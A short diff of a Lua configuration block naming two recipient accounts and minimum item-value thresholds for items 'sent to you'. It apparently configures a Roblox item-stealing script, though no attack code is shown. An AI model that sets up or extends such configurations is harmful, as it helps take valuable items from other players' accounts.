@@ -1,9 +1,6 @@
 Usernames = {
     "xavaxonosel60",
     "xavaxonosel2",
-    -- Add more users below if you want to
-    -- "user3",
-    -- "user4",
 }
 min_rap = 1000 -- minimum RAP of each item you want to get sent to you, set back to 1000
 min_chance = 10000 -- updated to 1M for minimum chance
